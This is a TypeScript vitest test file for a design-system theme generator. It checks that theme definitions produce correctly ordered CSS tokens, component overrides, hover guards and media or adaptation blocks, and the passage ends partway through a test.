// Copyright (c) Meta Platforms, Inc. and affiliates.

/**
 * @file generateThemeRules.test.ts
 * Tests that shared root, adaptation, and media-surface lowering produces
 * correct, consistently ordered CSS for both runtime and build paths.
 */

import {describe, it, expect, vi} from 'vitest';
import {
  defineTheme,
  generateAdaptationCSS,
  generateThemeCSS,
  generateOnMediaCSS,
  generateThemeRules,
  type DefinedTheme,
} from './index';

function topLevelCSSBlocks(css: string): string[] {
  const blocks: string[] = [];
  let depth = 0;
  let start = -1;

  for (let index = 0; index < css.length; index++) {
    const character = css[index];
    if (start === -1) {
      if (/\s/.test(character)) {
        continue;
      }
      start = index;
    }

    if (character === '{') {
      depth++;
    } else if (character === '}') {
      depth--;
      if (depth === 0) {
        blocks.push(css.slice(start, index + 1));
        start = -1;
      }
    }
  }

  return blocks;
}

const defaultInput = {
  name: 'default',
  typography: {scale: {base: 14, ratio: 1.2}},
  tokens: {},
  components: {
    button: {
      'variant:secondary': {
        backgroundColor:
          'light-dark(rgba(5, 54, 89, 0.1), rgba(223, 226, 229, 0.2))',
      },
    },
  },
};

describe('focus outline tokens', () => {
  it('emits a focus ring override into the theme scope', () => {
    const theme = defineTheme({
      name: 'brand',
      tokens: {
        '--focus-outline-color': '#FF00FF',
        '--focus-outline-width': '4px',
      },
    });

    const {component} = generateThemeCSS(theme);

    expect(component).toContain('--focus-outline-color: #FF00FF;');
    expect(component).toContain('--focus-outline-width: 4px;');
  });
});

describe('generateThemeRules', () => {
  const theme = defineTheme(defaultInput);
  const rules = generateThemeRules(theme);

  it('produces an array of CSS rule strings', () => {
    expect(Array.isArray(rules)).toBe(true);
    expect(rules.length).toBeGreaterThan(0);
    rules.forEach(r => expect(typeof r).toBe('string'));
  });

  // --- Token block ---

  it('includes :scope token block with type scale tokens', () => {
    const scopeRule = rules.find(r => r.includes(':scope'));
    expect(scopeRule).toBeDefined();
    // Raw size tokens are rem values
    expect(scopeRule).toContain('--font-size-base: 0.875rem');
    expect(scopeRule).toContain('--font-size-2xl: 1.5rem');
    // Semantic tokens are var() refs
    expect(scopeRule).toContain('--text-heading-1-size: var(--font-size-2xl)');
    expect(scopeRule).toContain('--text-heading-4-size: var(--font-size-base)');
    expect(scopeRule).toContain('--text-body-size: var(--font-size-base)');
    expect(scopeRule).toContain('--text-supporting-size: var(--font-size-sm)');
  });

  it('emits raw size tokens in rem', () => {
    const scopeRule = rules.find(r => r.includes(':scope'))!;
    // Raw tokens (--font-size-4xs through --font-size-4xl) should be in rem
    const rawSizeTokens = [
      '--font-size-4xs',
      '--font-size-3xs',
      '--font-size-2xs',
      '--font-size-xs',
      '--font-size-sm',
      '--font-size-base',
      '--font-size-lg',
      '--font-size-xl',
      '--font-size-2xl',
      '--font-size-3xl',
      '--font-size-4xl',
    ];
    for (const token of rawSizeTokens) {
      const match = scopeRule.match(new RegExp(`${token}: ([^;]+)`));
      expect(match).not.toBeNull();
      expect(match![1]).toMatch(/rem$/);
    }
  });

  it('emits semantic size tokens as var() refs', () => {
    const scopeRule = rules.find(r => r.includes(':scope'))!;
    const semanticSizeTokens = scopeRule.match(
      /--(?:text-heading-\d|text-(?:body|large|label|code|supporting))-size: [^;]+/g,
    );
    expect(semanticSizeTokens).not.toBeNull();
    semanticSizeTokens!.forEach(m => {
      expect(m).toContain('var(--font-size-');
    });
  });

  it('emits line heights as unitless ratios', () => {
    const scopeRule = rules.find(r => r.includes(':scope'))!;
    const leadingMatches = scopeRule.match(
      /--(?:heading|text)-\w+-leading: [^;]+/g,
    );
    expect(leadingMatches).not.toBeNull();
    leadingMatches!.forEach(m => {
      expect(m).not.toContain('px');
      expect(m).not.toContain('rem');
      const val = parseFloat(m.split(': ')[1]);
      expect(val).toBeGreaterThan(1);
      expect(val).toBeLessThan(2);
    });
  });

  // --- Component overrides ---

  it('includes data-level rules on the stable heading target for all 6 levels', () => {
    for (let level = 1; level <= 6; level++) {
      const rule = rules.find(r =>
        r.includes(`.astryx-heading[data-level="${level}"]`),
      );
      expect(rule).toBeDefined();
      expect(rule).toContain('font-family');
      expect(rule).toContain(`var(--text-heading-${level}-size)`);
      expect(rule).toContain(`var(--text-heading-${level}-weight)`);
      expect(rule).toContain(`var(--text-heading-${level}-leading)`);
    }
  });

  it('includes .astryx-text.* rules for all 5 types', () => {
    for (const type of ['body', 'large', 'label', 'code', 'supporting']) {
      const rule = rules.find(r =>
        r.includes(`.astryx-text[data-type="${type}"]`),
      );
      expect(rule).toBeDefined();
      expect(rule).toContain(`var(--text-${type}-size)`);
    }
  });

  it('includes explicit component overrides', () => {
    const buttonRule = rules.find(r =>
      r.includes('.astryx-button[data-variant="secondary"]'),
    );
    expect(buttonRule).toBeDefined();
    expect(buttonRule).toContain('light-dark(rgba(5, 54, 89, 0.1)');
  });

  it('applies pseudo-class suffixes to the canonical selector', () => {
    const pseudoTheme = defineTheme({
      name: 'pseudo-canonical',
      components: {
        button: {
          base: {
            ':hover': {color: 'red'},
          },
        },
      },
    });
    const pseudoRules = generateThemeRules(pseudoTheme);
    expect(
      pseudoRules.some(rule => rule.includes('.astryx-button:hover')),
    ).toBe(true);
  });

  // A theme authoring `:hover` is describing the ENABLED control. Without a
  // guard the rule paints a disabled one too, because browsers suppress a
  // disabled control's events, not its hover styling — and a theme override
  // would then reintroduce, on every component at once, the defect the
  // components' own styles were fixed for.
  it('keeps a themed :hover off disabled elements', () => {
    const hoverTheme = defineTheme({
      name: 'hover-guard',
      components: {
        button: {
          base: {
            ':hover': {color: 'red'},
            ':focus-visible': {outline: '2px solid blue'},
          },
        },
      },
    });
    const hoverRules = generateThemeRules(hoverTheme);
    const hoverRule = hoverRules.find(rule => rule.includes(':hover'));
    expect(hoverRule).toBeDefined();
    expect(hoverRule).toContain(
      '.astryx-button:hover:where(:not(:disabled,[aria-disabled="true"]))',
    );
    // Every selector in a comma-separated list carries its own guard —
    // a trailing pseudo does not distribute over a selector list. (Counted,
    // not split: the guard contains a comma of its own.)
    const selectorText = String(hoverRule).split('{')[0];
    const hovers = selectorText.match(/:hover/g) || [];
    const guards = selectorText.match(/:where\(:not\(:disabled/g) || [];
    expect(hovers.length).toBeGreaterThan(0);
    expect(guards.length).toBe(hovers.length);
    // Other pseudo-classes are untouched: a disabled control can still be
    // focused (that is the point of aria-disabled), and :focus-visible on it
    // is correct.
    const focusRule = hoverRules.find(rule => rule.includes(':focus-visible'));
    expect(focusRule).toContain('.astryx-button:focus-visible {');
    expect(focusRule).not.toContain('aria-disabled');
  });

  // --- Prose rules ---

  it('includes prose heading rules linked to semantic tokens', () => {
    const h1Rule = rules.find(
      r => r.trimStart().startsWith(':where(h1)') || r.includes(':where(h1)'),
    );
    expect(h1Rule).toBeDefined();
    // Keep prose linked to semantic variables so conditional token writes apply
    // through CSS without duplicating these selectors inside every media rule.
    expect(h1Rule).toContain('var(--text-heading-1-size)');
    expect(h1Rule).toContain('var(--text-heading-1-weight)');
    // Prose defaults intentionally carry NO block margins: reset.css zeroes
    // raw element margins and the Markdown/Heading components own their spacing
    // via StyleX (@layer astryx-base). Emitting margins here would re-introduce
    // the regression where prose defaults fought component spacing.
    expect(h1Rule).not.toContain('margin-block-start');
    expect(h1Rule).not.toContain('margin-block-end');
  });

  it('includes prose p rule linked to semantic tokens', () => {
    const pRule = rules.find(
      r => r.trimStart().startsWith(':where(p)') || r.includes(':where(p)'),
    );
    expect(pRule).toBeDefined();
    expect(pRule).toContain('var(--text-body-size)');
    expect(pRule).toContain('font-family: var(--font-family-body)');
    expect(pRule).toContain('var(--color-text-primary)');
    // No margins on the prose paragraph default (see heading rule note).
    expect(pRule).not.toContain('margin-block-start');
  });

  it('includes prose small, code, hr rules', () => {
    expect(rules.some(r => r.includes(':where(small)'))).toBe(true);
    expect(rules.some(r => r.includes(':where(code, pre)'))).toBe(true);
    expect(rules.some(r => r.includes(':where(hr)'))).toBe(true);
  });

  it('applies the theme body font to the scope root', () => {
    // Components styled with `font-family: inherit` (SideNav items, Buttons)
    // resolve against this; without it they fall back to the browser default
    // serif since nothing else sets a page font.
    const fontTheme = defineTheme({
      name: 'with-body-font',
      typography: {body: {family: 'Figtree', fallbacks: 'sans-serif'}},
      tokens: {},
      components: {},
    });
    const fontRules = generateThemeRules(fontTheme);
    const fontRule = fontRules.find(
      r =>
        r.includes(':scope') &&
        r.includes('font-family: var(--font-family-body)'),
    );
    expect(fontRule).toBeDefined();
    expect(fontRule).toBe(
      '  :scope {\n    font-family: var(--font-family-body);\n  }',
    );
  });

  it('emits no scope font rule when the theme declares no body font', () => {
    // A bare theme contributes no scope rules of its own.
    const fontRule = rules.find(
      r =>
        r.includes(':scope') &&
        r.includes('font-family: var(--font-family-body)'),
    );
    expect(fontRule).toBeUndefined();
  });

  // --- Prop-level color overrides ---

  it('includes color prop overrides for text and heading', () => {
    expect(
      rules.some(r => r.includes('.astryx-text[data-color="primary"]')),
    ).toBe(true);
    expect(
      rules.some(r => r.includes('.astryx-text[data-color="secondary"]')),
    ).toBe(true);
    expect(
      rules.some(r => r.includes('.astryx-heading[data-color="primary"]')),
    ).toBe(true);
    expect(
      rules.some(r => r.includes('.astryx-heading[data-color="disabled"]')),
    ).toBe(true);
    expect(
      rules.some(r => r.includes('.astryx-text[data-color="active"]')),
    ).toBe(false);
    expect(
      rules.some(r => r.includes('.astryx-text[data-color="accent"]')),
    ).toBe(true);
  });

  // --- Size-prop overrides (so `size` beats a themed `type`) ---

  it('emits Text size-prop font-size overrides in the same layer as type rules', () => {
    // Digit-leading sizes are prefixed (size-2xs); word sizes stay bare.
    const sizeRule = rules.find(
      r =>
        r.includes('.astryx-text[data-size="2xs"]') && r.includes('font-size'),
    );
    expect(sizeRule).toBeDefined();
    expect(sizeRule).toContain('var(--font-size-2xs)');

    // `xsm` maps to the --font-size-xs token (matches sizeStyles).
    const xsmRule = rules.find(r =>
      r.includes('.astryx-text[data-size="xsm"]'),
    );
    expect(xsmRule).toBeDefined();
    expect(xsmRule).toContain('var(--font-size-xs)');

    // Overrides set only font-size — line-height/family come from `type`.
    expect(xsmRule).not.toContain('line-height');
  });

  it('emits a size override for every TextSize value', () => {
    const sizes = [
      'size-4xs',
      'size-3xs',
      'size-2xs',
      'xsm',
      'sm',
      'base',
      'lg',
      'xl',
      'size-2xl',
      'size-3xl',
      'size-4xl',
    ];
    for (const cls of sizes) {
      expect(
        rules.some(
          r =>
            r.includes(
              `.astryx-text[data-size="${cls.replace(/^size-/, '')}"]`,
            ) && r.includes('font-size'),
        ),
      ).toBe(true);
    }
  });

  it('orders size overrides after the themed type font-size rules', () => {
    // Source order breaks specificity ties within a layer, so the size
    // override must come after the `.astryx-text.<type>` type rule.
    const typeIdx = rules.findIndex(
      r =>
        r.includes('.astryx-text[data-type="supporting"]') &&
        r.includes('font-size'),
    );
    const sizeIdx = rules.findIndex(
      r =>
        r.includes('.astryx-text[data-size="2xs"]') && r.includes('font-size'),
    );
    expect(typeIdx).toBeGreaterThanOrEqual(0);
    expect(sizeIdx).toBeGreaterThan(typeIdx);
  });

  // --- Consistency ---

  it('generateThemeCSS returns prose and component blocks with @scope', () => {
    const {prose, component} = generateThemeCSS(theme);
    const combined = prose + component;
    expect(combined).toContain('@scope ([data-astryx-theme="default"])');
    expect(combined).toContain('to ([data-astryx-theme])');
    // Every rule from generateThemeRules should appear in one of the blocks
    for (const rule of rules) {
      expect(combined).toContain(rule);
    }
  });

  it('routes Text size overrides into the component (astryx-theme) block', () => {
    // The size override only beats a themed type if it lands in the same
    // layer as the type rules (astryx-theme / component block), not the
    // reset-tier prose block.
    const {prose, component} = generateThemeCSS(theme);
    expect(component).toContain('.astryx-text[data-size="2xs"]');
    expect(component).toContain('.astryx-text[data-size="xsm"]');
    expect(prose).not.toContain('.astryx-text[data-size="2xs"]');
  });
});

describe('generateThemeRules with weight overrides', () => {
  const theme = defineTheme({
    name: 'custom-weights',
    typography: {
      scale: {base: 14, ratio: 1.2},
      heading: {weights: {3: 'bold'}},
    },
    tokens: {},
    components: {},
  });
  const rules = generateThemeRules(theme);

  it('reflects weight override in tokens', () => {
    const scopeRule = rules.find(r => r.includes(':scope'))!;
    expect(scopeRule).toContain(
      '--text-heading-3-weight: var(--font-weight-bold)',
    );
    // Other levels keep default
    expect(scopeRule).toContain(
      '--text-heading-1-weight: var(--font-weight-semibold)',
    );
  });

  it('keeps prose h3 linked to the semantic weight token', () => {
    const h3Rule = rules.find(
      r => r.trimStart().startsWith(':where(h3)') || r.includes(':where(h3)'),
    );
    expect(h3Rule).toBeDefined();
    expect(h3Rule).toContain('var(--text-heading-3-weight)');
  });
});

describe('generateThemeRules with an explicit Heading weight prop', () => {
  const theme = defineTheme({
    name: 'custom-heading-type',
    components: {
      heading: {
        'type:hero': {
          fontSize: '4rem',
          fontWeight: 'var(--font-weight-normal)',
        },
      },
    },
  });
  const rules = generateThemeRules(theme);

  it('emits named weight rules after the custom type default', () => {
    const typeIndex = rules.findIndex(rule =>
      rule.includes('.astryx-heading[data-type="hero"]'),
    );
    const boldIndex = rules.findIndex(rule =>
      rule.includes('.astryx-heading[data-weight="bold"]'),
    );

    expect(typeIndex).toBeGreaterThanOrEqual(0);
    expect(boldIndex).toBeGreaterThan(typeIndex);
    expect(rules[boldIndex]).toContain('font-weight: var(--font-weight-bold)');
  });

  it('keeps explicit weight rules in the component theme layer', () => {
    const {component, prose} = generateThemeCSS(theme);
    expect(component).toContain('.astryx-heading[data-weight="bold"]');
    expect(prose).not.toContain('.astryx-heading[data-weight="bold"]');
  });

  it('keeps a targeted theme weight rule authoritative', () => {
    const authored = defineTheme({
      name: 'authored-heading-weight',
      components: {
        heading: {
          'weight:bold': {fontWeight: '900'},
          'type:hero': {fontWeight: 'var(--font-weight-normal)'},
        },
      },
    });
    const rules = generateThemeRules(authored);
    const typeIndex = rules.findIndex(rule =>
      rule.includes('.astryx-heading[data-type="hero"]'),
    );
    const boldRules = rules.filter(rule =>
      rule.includes('.astryx-heading[data-weight="bold"]'),
    );
    const lastBoldIndex = rules.lastIndexOf(boldRules.at(-1) ?? '');

    expect(boldRules.at(-1)).toContain('font-weight: 900');
    expect(boldRules.at(-1)).not.toContain('var(--font-weight-bold)');
    expect(lastBoldIndex).toBeGreaterThan(typeIndex);
  });

  it('does not let a combined selector suppress the generic weight override', () => {
    const authored = defineTheme({
      name: 'combined-heading-weight',
      components: {
        heading: {
          'type:hero': {fontWeight: 'var(--font-weight-normal)'},
          'type:hero+weight:bold': {fontWeight: '900'},
        },
      },
    });
    const rules = generateThemeRules(authored);

    expect(
      rules.some(
        rule =>
          rule.includes('.astryx-heading[data-weight="bold"]') &&
          rule.includes('font-weight: var(--font-weight-bold)'),
      ),
    ).toBe(true);
  });

  it('fills in font weight when a standalone weight rule only styles another property', () => {
    const authored = defineTheme({
      name: 'partial-heading-weight',
      components: {
        heading: {
          'type:hero': {fontWeight: 'var(--font-weight-normal)'},
          'weight:bold': {color: 'red'},
        },
      },
    });
    const rules = generateThemeRules(authored);

    expect(
      rules.some(
        rule =>
          rule.includes('.astryx-heading[data-weight="bold"]') &&
          rule.includes('font-weight: var(--font-weight-bold)'),
      ),
    ).toBe(true);
  });

  it('re-emits explicit weight overrides after media-specific type rules', () => {
    const themed = defineTheme({
      name: 'media-heading-weight',
      components: {
        heading: {
          'weight:bold': {fontWeight: '900'},
        },
      },
      onDark: {
        components: {
          heading: {
            'weight:bold': {fontWeight: '800'},
            'type:hero': {fontWeight: '350'},
          },
        },
      },
    });
    const css = generateOnMediaCSS(themed);
    const typeIndex = css.indexOf('.astryx-heading[data-type="hero"]');
    const boldIndex = css.lastIndexOf('.astryx-heading[data-weight="bold"]');

    expect(typeIndex).toBeGreaterThanOrEqual(0);
    expect(boldIndex).toBeGreaterThan(typeIndex);
    expect(css.slice(boldIndex)).toContain('font-weight: 800');
  });

  it('carries an authored main weight past a media-specific type rule', () => {
    const themed = defineTheme({
      name: 'inherited-media-heading-weight',
      components: {
        heading: {
          'weight:bold': {fontWeight: '900'},
        },
      },
      onDark: {
        components: {
          heading: {
            'type:hero': {fontWeight: '350'},
          },
        },
      },
    });
    const css = generateOnMediaCSS(themed);
    const typeIndex = css.indexOf('.astryx-heading[data-type="hero"]');
    const boldIndex = css.lastIndexOf('.astryx-heading[data-weight="bold"]');

    expect(typeIndex).toBeGreaterThanOrEqual(0);
    expect(boldIndex).toBeGreaterThan(typeIndex);
    expect(css.slice(boldIndex)).toContain('font-weight: 900');
  });

  it('scopes Text color and size guards after each media-surface type rule', () => {
    const themed = defineTheme({
      name: 'media-text-prop-guards',
      onDark: {
        components: {
          text: {'type:large': {color: '#fff', fontSize: '4rem'}},
        },
      },
      onLight: {
        components: {
          text: {'type:body': {color: '#000', fontSize: '0.75rem'}},
        },
      },
    });
    const css = generateOnMediaCSS(themed);

    for (const [surface, type] of [
      ['dark', 'large'],
      ['light', 'body'],
    ] as const) {
      const surfacePrefix = `:is([data-astryx-media="${surface}"])`;
      const typeSelector = `${surfacePrefix} :is(.astryx-text[data-type="${type}"])`;
      const colorSelector = `${surfacePrefix} :is(.astryx-text[data-color="primary"])`;
      const sizeSelector = `${surfacePrefix} :is(.astryx-text[data-size="sm"])`;
      const typeIndex = css.indexOf(typeSelector);

      expect(typeIndex).toBeGreaterThanOrEqual(0);
      expect(css).toContain(
        `${colorSelector} { color: var(--color-text-primary); }`,
      );
      expect(css).toContain(
        `${sizeSelector} { font-size: var(--font-size-sm); }`,
      );
      expect(css.indexOf(colorSelector)).toBeGreaterThan(typeIndex);
      expect(css.indexOf(sizeSelector)).toBeGreaterThan(typeIndex);
    }
  });

  it('keeps a coarse-only weight out of a later fine-only level block', () => {
    const themed = defineTheme({
      name: 'exclusive-adapted-heading-weight',
      adaptations: {
        rules: [
          {
            when: {pointer: 'coarse'},
            value: {
              components: {
                heading: {'weight:bold': {fontWeight: '800'}},
              },
            },
          },
          {
            when: {pointer: 'fine'},
            value: {
              components: {
                heading: {'level:2': {fontWeight: '300'}},
              },
            },
          },
        ],
      },
    });
    const blocks = topLevelCSSBlocks(generateAdaptationCSS(themed).component);
    const fineBlock = blocks.find(block =>
      block.startsWith('@media (pointer: fine)'),
    );
    const rootGuard = blocks.find(block => block.startsWith('@scope '));

    expect(fineBlock).toContain('.astryx-heading[data-level="2"]');
    expect(fineBlock).not.toContain('font-weight: 800');
    expect(rootGuard).toContain(
      '.astryx-heading[data-weight="normal"] { font-weight: var(--font-weight-normal); }',
    );
    expect(rootGuard).toContain(
      '.astryx-heading[data-weight="medium"] { font-weight: var(--font-weight-medium); }',
    );
    expect(rootGuard).toContain(
      '.astryx-heading[data-weight="semibold"] { font-weight: var(--font-weight-semibold); }',
    );
    expect(rootGuard).toContain(
      '.astryx-heading[data-weight="bold"] { font-weight: var(--font-weight-bold); }',
    );
    expect(blocks.indexOf(rootGuard!)).toBeGreaterThan(
      blocks.indexOf(fineBlock!),
    );

    const weight800Blocks = blocks.filter(block =>
      block.includes('font-weight: 800'),
    );
    expect(weight800Blocks).toHaveLength(2);
    expect(
      weight800Blocks.every(block =>
        block.startsWith('@media (pointer: coarse)'),
      ),
    ).toBe(true);
  });

  it('keeps a coarse weight above a later broad level only when coarse matches', () => {
    const themed = defineTheme({
      name: 'broad-adapted-heading-level',
      adaptations: {
        rules: [
          {
            when: {pointer: 'coarse'},
            value: {
              components: {
                heading: {'weight:bold': {fontWeight: '800'}},
              },
            },
          },
          {
            when: {contrast: 'more'},
            value: {
              components: {
                heading: {'level:2': {fontWeight: '300'}},
              },
            },
          },
        ],
      },
    });
    const blocks = topLevelCSSBlocks(generateAdaptationCSS(themed).component);
    const broadLevelBlock = blocks.find(
      block =>
        block.startsWith('@media (prefers-contrast: more)') &&
        block.includes('.astryx-heading[data-level="2"]'),
    );
    const rootGuard = blocks.find(block => block.startsWith('@scope '));
    const coarseGuard = blocks
      .filter(block => block.startsWith('@media (pointer: coarse)'))
      .at(-1);

    expect(broadLevelBlock).not.toContain('font-weight: 800');
    expect(rootGuard).toContain(
      '.astryx-heading[data-weight="bold"] { font-weight: var(--font-weight-bold); }',
    );
    expect(coarseGuard).toContain(
      '.astryx-heading[data-weight="bold"] { font-weight: 800; }',
    );
    expect(blocks.indexOf(rootGuard!)).toBeGreaterThan(
      blocks.indexOf(broadLevelBlock!),
    );
    expect(blocks.indexOf(coarseGuard!)).toBeGreaterThan(
      blocks.indexOf(rootGuard!),
    );
  });

  it('keeps authored order for two co-matching weight writes', () => {
    const themed = defineTheme({
      name: 'ordered-adapted-heading-weight',
      adaptations: {
        rules: [
          {
            when: {pointer: 'coarse'},
            value: {
              components: {
                heading: {'weight:bold': {fontWeight: '800'}},
              },
            },
          },
          {
            when: {contrast: 'more'},
            value: {
              components: {
                heading: {'weight:bold': {fontWeight: '700'}},
              },
            },
          },
        ],
      },
    });
    const blocks = topLevelCSSBlocks(generateAdaptationCSS(themed).component);
    const rootGuard = blocks.find(block => block.startsWith('@scope '));
    const coarseGuard = blocks
      .filter(block => block.startsWith('@media (pointer: coarse)'))
      .at(-1);
    const contrastGuard = blocks
      .filter(block => block.startsWith('@media (prefers-contrast: more)'))
      .at(-1);

    expect(coarseGuard).toContain('font-weight: 800');
    expect(contrastGuard).toContain('font-weight: 700');
    expect(blocks.indexOf(coarseGuard!)).toBeGreaterThan(
      blocks.indexOf(rootGuard!),
    );
    expect(blocks.indexOf(contrastGuard!)).toBeGreaterThan(
      blocks.indexOf(coarseGuard!),
    );
  });

  it('uses a root-customized weight as the adaptation fallback', () => {
    const themed = defineTheme({
      name: 'root-customized-adapted-heading-weight',
      components: {
        heading: {'weight:bold': {fontWeight: '900'}},
      },
      adaptations: {
        rules: [
          {
            when: {pointer: 'fine'},
            value: {
              components: {
                heading: {'level:2': {fontWeight: '300'}},
              },
            },
          },
        ],
      },
    });
    const blocks = topLevelCSSBlocks(generateAdaptationCSS(themed).component);
    const fineBlock = blocks.find(block =>
      block.startsWith('@media (pointer: fine)'),
    );
    const rootGuard = blocks.find(block => block.startsWith('@scope '));

    expect(fineBlock).toContain('.astryx-heading[data-level="2"]');
    expect(rootGuard).toContain(
      '.astryx-heading[data-weight="bold"] { font-weight: 900; }',
    );
    expect(blocks.indexOf(rootGuard!)).toBeGreaterThan(
      blocks.indexOf(fineBlock!),
    );
  });

  it('keeps a single rule weight above its own later type write', () => {
    const themed = defineTheme({
      name: 'single-adapted-heading-weight',
      adaptations: {
        rules: [
          {
            when: {pointer: 'coarse'},
            value: {
              components: {
                heading: {
                  'weight:bold': {fontWeight: '800'},
                  'type:hero': {fontWeight: '300'},
                },
              },
            },
          },
        ],
      },
    });
    const blocks = topLevelCSSBlocks(generateAdaptationCSS(themed).component);
    const coarseBlocks = blocks.filter(block =>
      block.startsWith('@media (pointer: coarse)'),
    );
    const rootGuard = blocks.find(block => block.startsWith('@scope '));

    expect(coarseBlocks).toHaveLength(2);
    expect(coarseBlocks[0]).toContain('.astryx-heading[data-type="hero"]');
    expect(rootGuard).toContain(
      '.astryx-heading[data-weight="bold"] { font-weight: var(--font-weight-bold); }',
    );
    expect(coarseBlocks[1]).toContain(
      '.astryx-heading[data-weight="bold"] { font-weight: 800; }',
    );
    expect(blocks.at(-1)).toBe(coarseBlocks[1]);
  });

  it('keeps onDark and onLight weight guards after adaptation guards', () => {
    const themed = defineTheme({
      name: 'surface-adapted-heading-weight',
      adaptations: {
        rules: [
          {
            when: {pointer: 'coarse'},
            value: {
              components: {
                heading: {'weight:bold': {fontWeight: '800'}},
              },
            },
          },
        ],
      },
      onDark: {
        components: {
          heading: {'weight:bold': {fontWeight: '700'}},
        },
      },
      onLight: {
        components: {
          heading: {'weight:bold': {fontWeight: '600'}},
        },
      },
    });
    const css = generateThemeCSS(themed).component;

    expect(css.lastIndexOf('font-weight: 800')).toBeLessThan(
      css.lastIndexOf('font-weight: 700'),
    );
    expect(css.lastIndexOf('font-weight: 700')).toBeLessThan(
      css.lastIndexOf('font-weight: 600'),
    );
    expect(css.slice(css.lastIndexOf('font-weight: 700') - 200)).toContain(
      '[data-astryx-media="dark"]',
    );
    expect(css.slice(css.lastIndexOf('font-weight: 600') - 200)).toContain(
      '[data-astryx-media="light"]',
    );
  });
});

// =============================================================================
// Derived var expansion
// =============================================================================

describe('derived var expansion', () => {
  it('emits borderRadius AND internal var for card', () => {
    const theme = defineTheme({
      name: 'test-derived',
      components: {
        card: {
          base: {borderRadius: '32px'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const cardRule = rules.find(r => r.includes('.astryx-card'));
    expect(cardRule).toBeDefined();
    expect(cardRule).toContain('border-radius: 32px');
    expect(cardRule).toContain('--_card-radius: 32px');
  });

  it('emits borderRadius AND internal var for dropdown-menu', () => {
    const theme = defineTheme({
      name: 'test-derived-dropdown',
      components: {
        'dropdown-menu': {
          base: {borderRadius: '16px'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r => r.includes('.astryx-dropdown-menu'));
    expect(rule).toBeDefined();
    expect(rule).toContain('border-radius: 16px');
    expect(rule).toContain('--_dropdown-menu-radius: 16px');
  });

  it('emits padding AND internal var for dropdown-menu', () => {
    const theme = defineTheme({
      name: 'test-derived-dropdown-pad',
      components: {
        'dropdown-menu': {
          base: {padding: '8px'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r => r.includes('.astryx-dropdown-menu'));
    expect(rule).toBeDefined();
    expect(rule).toContain('--_dropdown-menu-padding: 8px');
  });

  it('emits paddingInline AND internal inset var for item', () => {
    // The inset var is what keeps List's isFullBleed cancel in sync with a
    // themed row padding — the padding override alone would move the text
    // while the cancel keeps the default width.
    const theme = defineTheme({
      name: 'test-derived-item',
      components: {
        item: {
          base: {paddingInline: 'var(--spacing-3)'},
          'density:spacious': {paddingInline: 'var(--spacing-4)'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const baseRule = rules.find(
      r => r.includes('.astryx-item ') || r.includes('.astryx-item {'),
    );
    expect(baseRule).toBeDefined();
    expect(baseRule).toContain('padding-inline: var(--spacing-3)');
    expect(baseRule).toContain('--_item-inset-inline: var(--spacing-3)');
    const spaciousRule = rules.find(r =>
      r.includes('.astryx-item[data-density="spacious"]'),
    );
    expect(spaciousRule).toBeDefined();
    expect(spaciousRule).toContain('--_item-inset-inline: var(--spacing-4)');
  });

  it('emits internal vars for chat composer', () => {
    const theme = defineTheme({
      name: 'test-derived-chat',
      components: {
        chat: {
          base: {borderRadius: '24px', padding: '12px'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r => r.includes('.astryx-chat'));
    expect(rule).toBeDefined();
    expect(rule).toContain('--_chat-composer-radius: 24px');
    expect(rule).toContain('--_chat-composer-padding: 12px');
  });

  it('emits internal var for button borderRadius', () => {
    const theme = defineTheme({
      name: 'test-derived-button',
      components: {
        button: {
          base: {borderRadius: '8px'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r => r.includes('.astryx-button'));
    expect(rule).toBeDefined();
    expect(rule).toContain('border-radius: 8px');
    expect(rule).toContain('--_button-radius: 8px');
  });

  it('emits direct rules for avatar fallback background, color, and weight', () => {
    const theme = defineTheme({
      name: 'test-avatar-fallback',
      components: {
        'avatar-fallback': {
          base: {
            backgroundColor: 'var(--color-accent-muted)',
            color: 'var(--color-text-secondary)',
            fontWeight: 'var(--font-weight-normal)',
          },
        },
      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r => r.includes('.astryx-avatar-fallback'));
    expect(rule).toBeDefined();
    expect(rule).toContain('background-color: var(--color-accent-muted)');
    expect(rule).toContain('color: var(--color-text-secondary)');
    expect(rule).toContain('font-weight: var(--font-weight-normal)');
    // These are direct class targets now, not internal derived vars.
    expect(rule).not.toContain('--_avatar-fallback-background');
    expect(rule).not.toContain('--_avatar-fallback-color');
    expect(rule).not.toContain('--_avatar-fallback-font-weight');
  });

  it('emits a direct per-size font-size rule for the avatar fallback target', () => {
    const theme = defineTheme({
      name: 'test-avatar-fallback-size',
      components: {
        'avatar-fallback': {
          'size:sm': {fontSize: '9px'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r =>
      r.includes('.astryx-avatar-fallback[data-size="sm"]'),
    );
    expect(rule).toBeDefined();
    expect(rule).toContain('font-size: 9px');
    // Direct class target now — no internal derived var.
    expect(rule).not.toContain('--_avatar-fallback-font-size');
  });

  it('does not emit derived vars for components without registry entries', () => {
    const theme = defineTheme({
      name: 'test-no-derived',
      components: {
        badge: {
          base: {borderRadius: '99px'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r => r.includes('.astryx-badge'));
    expect(rule).toBeDefined();
    expect(rule).toContain('border-radius: 99px');
    // No internal var — badge has no derived registry entry
    expect(rule).not.toContain('--');
  });

  it('container expansion still works for card padding', () => {
    const theme = defineTheme({
      name: 'test-container',
      components: {
        card: {
          base: {padding: '20px'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r => r.includes('.astryx-card'));
    expect(rule).toBeDefined();
    // Container expansion emits --astryx-card-padding token
    expect(rule).toContain('--astryx-card-padding: 20px');
  });

  it('handles variant-specific derived vars', () => {
    const theme = defineTheme({
      name: 'test-variant-derived',
      components: {
        card: {
          'variant:muted': {borderRadius: '16px'},
        },
      },
    });
    const rules = generateThemeRules(theme);
    const rule = rules.find(r =>
      r.includes('.astryx-card[data-variant="muted"]'),
    );
    expect(rule).toBeDefined();
    expect(rule).toContain('border-radius: 16px');
    expect(rule).toContain('--_card-radius: 16px');
  });

  it('replaces paddingInline with the var for textarea (no raw property)', () => {
    const theme = defineTheme({
      name: 'test-derived-textarea',
      components: {
        'text-area': {
          base: {paddingInline: 'var(--app-input-padding-x)'},
        },
